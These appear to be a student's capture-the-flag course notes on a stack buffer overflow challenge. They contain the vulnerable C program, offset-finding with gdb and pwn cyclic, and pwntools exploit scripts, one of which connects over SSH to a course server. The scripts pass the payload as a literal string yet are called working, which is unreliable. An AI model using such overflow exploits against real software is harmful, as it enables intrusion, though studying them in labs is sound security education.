#CS4401 #CTF

### Common causes of SegFault after the exploit function is called
#memory 
- use python 2.7 instead of python3 for pwntools
- Forgot to create flag.txt
- MOVAPS
	- Deals with address space
	- movaps requires the stack to be properly aligned (at a multiple of 16-bytes)
	- misalignment of the stack: rsp is not at an aligned address
	- **Questions**
		- What causes misalignment of the stack
		- Why does this cause a SegFault
	- Ctrl+D creates an EOF indicator
`stack1.c`
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <err.h>


int main(int argc, char **argv){
	volatile int debug_password;
	char buffer[{{buffsize}}];
	char *generator_mode;
	FILE *fp;  
	
	generator_mode = getenv("DEBUG");
	//2: what are environment variables
	if(generator_mode == NULL) {
		errx(1, "Please set the DEBUG environment variable\n");
	}

	debug_password = 0;
	//1: how does string copy work?
	strcpy(buffer, generator_mode);
	fp = fopen("./flag.txt", "r");

	if(debug_password == 0x0d0a0d0a) {
		printf("You have correctly entered Debug Mode\n");
		printf("Verbosity level of errors increased\n");
		fgets(buffer, 64, (FILE*)fp);
		printf("flag: %s\n", buffer );
		exit(0);
	} 
	else {
		printf("Try again, you got 0x%08x\n", debug_password);
	}  

}
```
possible sources of error for solving a challenge
- Make sure ASLR is off on the docker container
- Make sure you are using address layout from the course server
- Make sure you have a `flag.txt` file in your directory

1. How does `strcpy()` work?
	- Reads all characters given to it, can cause a buffer overflow
	- <mark style="background: #FF5582A6;">read the man page!!</mark>
2. What are Environment variables
	1. Environment variables in shell session for epic treasure container
#### `printenv` command output
```
root@a94da7bd1fca:~/host-share# printenv
SHELL=/bin/bash
TERM_PROGRAM_VERSION=3.2a
TMUX=/tmp/tmux-0/default,8,0
HOSTNAME=a94da7bd1fca
LANGUAGE=en_US:en
PWD=/root/host-share
HOME=/root
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:1st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.=tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz*=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.;zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01p;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svdgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;.35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
LESSCLOSE=/usr/bin/lesspipe %s %s
TERM=screen-256color
LESSOPEN=| /usr/bin/lesspipe %s
TMUX_PANE=%0
SHLVL=1
DEBUGINFOD_URLS=
LC_ALL=en_US.UTF-8
PATH=/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.fzf/bin
test=false
TERM_PROGRAM=tmux
_=/usr/bin/printenv
root@a94da7bd1fca:~/host-share#
```
	2. Set the DEBUG environment variable to the exploit_str: `export DEBUG='hellow'`
	3. `echo $DEBUG`

3. Determine the Offset
	1. Open in GDB, find addr of `buffer` and addr of `debug_password`
4. PWN CYCLIC
	1. `pwn cyclic 200`
		1. creates de bruin sequence of 200 characters long
	2. `pwn cyclic -l aaaa`
		1. Tells index of particular subset of the sequence; this will output `0`
	3. de bruin sequence used to help find length of the buffer
5. Use cyclic in environment variables: `export DEBUG = (backtic)pwn cyclic 200(backtic)`
	1. Backticks can be used as a way to set output of a script to an environment variable
6. input: DEBUG=`python2 -c 'a'*108 + '\x0d\x0a\x0d\x0a'`
	1. `try again addr was: 0x000d0a0d`
	2. export drops off trailing newlines
	3. sidestep this problem by not using export
	4. USE PWNTOOLS #pwntools
```python
from pwn import *

pattern = 0x0d0a0d0a
#set env vars with a dictionary
p = process('./stack1-64', env = {"DEBUG": "b'a'*108+p64(pattern)"})
p.interactive()
```
Yeah this works

with ssh
```python
from pwn import *

pattern = 0x0d0a0d0a
#set env vars with a dictionary

s = ssh('kcjesse', 'cs4401shell.walls.ninja', keyfile='./keys/kcjesse_ssh_key')

s.set_working_directory('/problems/stack1r-64_3_3d33185932f577a48072cc8b458bc93b/')

p = s.process('./stack1-64', env = {"DEBUG": "b'a'*108+p64(pattern)"})
p.interactive()
```